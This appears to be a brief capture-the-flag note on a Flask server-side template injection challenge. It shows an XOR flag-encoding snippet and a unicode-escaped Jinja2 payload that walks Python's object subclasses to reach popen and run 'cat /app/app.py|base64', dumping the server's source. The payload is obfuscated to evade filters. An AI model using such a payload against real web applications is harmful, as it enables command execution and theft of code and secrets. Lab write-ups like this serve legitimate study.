## flask_ssti
```PYTHON
def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5')
```


```
{{()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[127]["\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"]["\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"]["popen"]("\u0063\u0061\u0074\u0020\u002f\u0061\u0070\u0070\u002f\u0061\u0070\u0070\u002e\u0070\u0079\u007c\u0062\u0061\u0073\u0065\u0036\u0034")["read"]()}}
```

![](attachments/Pasted%20image%2020240411103941.png)

加密flag